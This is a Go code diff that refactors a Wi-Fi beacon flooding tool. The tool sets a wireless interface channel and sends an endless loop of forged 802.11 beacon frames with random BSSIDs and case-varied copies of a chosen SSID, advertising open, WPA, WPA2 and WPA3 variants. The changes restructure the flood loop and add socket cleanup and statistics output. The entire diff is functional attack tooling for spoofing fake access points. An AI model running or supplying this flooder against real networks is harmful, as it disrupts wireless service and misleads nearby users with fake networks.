@@ -43,6 +43,7 @@ type beaconFlood struct {
     bcSent    int
     builder  *frame80211.Beacon
     socket   *sockets.Layer2Socket
+    randGen  *generators.RandomValues
 }
 
 
@@ -53,20 +54,20 @@ func newBeaconFlooder(argList []string) *beaconFlood {
     ifconfig.MustSetChannel(bcArgs.Iface, bcArgs.Channel)
 
     return &beaconFlood{
-        channel: uint8(bcArgs.Channel),
-        ssid:    bcArgs.Ssid,
-        bcSent:  0,
-        builder: frame80211.NewBeacon(),
-        socket:  sockets.NewL2Socket(bcArgs.Iface),
+        channel : uint8(bcArgs.Channel),
+        ssid    : bcArgs.Ssid,
+        bcSent  : 0,
+        builder : frame80211.NewBeacon(),
+        socket  : sockets.NewL2Socket(bcArgs.Iface),
+        randGen : generators.NewRandomValues(),
     }
 }
 
 
 
-func (b *beaconFlood) execute() {
-    ctx     := utils.SignalContext()
-    randGen := generators.NewRandomValues()
-    start   := time.Now()
+func (bf *beaconFlood) execute() {
+    ctx   := utils.SignalContext()
+    start := time.Now()
     
 	fmt.Println("[+] Sending beacons. Press Ctrl+C to stop")
 
@@ -74,32 +75,55 @@ func (b *beaconFlood) execute() {
         select {
         case <-ctx.Done():
             elapsed := time.Since(start).Seconds()
-            fmt.Printf("\n[-] Flood interrupted\n")
-            fmt.Printf("[%%] %d beacons sent in %.2f seconds\n", b.bcSent, elapsed)
+            bf.closeSocket()
+            bf.displayExecInfo(elapsed)
             return
 
         default:
-            bssid := randGen.RandomMac()
-            ssid  := randGen.RandomCaseInversion(b.ssid)
-            seq   := randGen.RandomSeq()
-            b.sendQuartet(bssid, ssid, seq)
+            bf.sendBeacons()
         }
     }
 }
 
 
 
-func (b *beaconFlood) sendQuartet(bssid net.HardwareAddr, ssid string, seq uint16) {
-    b.sendBeacon(bssid, ssid, seq, "open")
-    b.sendBeacon(bssid, ssid, seq+1, "wpa")
-    b.sendBeacon(bssid, ssid, seq+2, "wpa2")
-    b.sendBeacon(bssid, ssid, seq+3, "wpa3")
+func (bf *beaconFlood) sendBeacons() {
+    bssid := bf.randGen.RandomMac()
+    ssid  := bf.randGen.RandomCaseInversion(bf.ssid)
+    seq   := bf.randGen.RandomSeq()
+    bf.sendQuartet(bssid, ssid, seq)
 }
 
 
 
-func (b *beaconFlood) sendBeacon(bssid net.HardwareAddr, ssid string, seq uint16, sec string) {
-    beacon := b.builder.Beacon(bssid, ssid, seq, b.channel, sec)
-    b.socket.Send(beacon)
-    b.bcSent++
+func (bf *beaconFlood) sendQuartet(bssid net.HardwareAddr, ssid string, seq uint16) {
+    bf.sendBeacon(bssid, ssid, seq, "open")
+    bf.sendBeacon(bssid, ssid, seq+1, "wpa")
+    bf.sendBeacon(bssid, ssid, seq+2, "wpa2")
+    bf.sendBeacon(bssid, ssid, seq+3, "wpa3")
+}
+
+
+
+func (bf *beaconFlood) sendBeacon(bssid net.HardwareAddr, ssid string, seq uint16, sec string) {
+    beacon := bf.builder.Beacon(bssid, ssid, seq, bf.channel, sec)
+    bf.socket.Send(beacon)
+    bf.bcSent++
+}
+
+
+
+func (bf *beaconFlood) displayExecInfo(elapsed float64) {
+    fmt.Printf("\n[-] Flood interrupted\n")
+    fmt.Printf("[%%] %d beacons sent in %.2f seconds\n", bf.bcSent, elapsed)
+}
+
+
+
+func (bf *beaconFlood) closeSocket() {
+    if bf.socket == nil { return }
+    
+    if err := bf.socket.Close(); err != nil {
+        fmt.Printf("[!] Error closing socket: %v\n", err)
+    }
 }
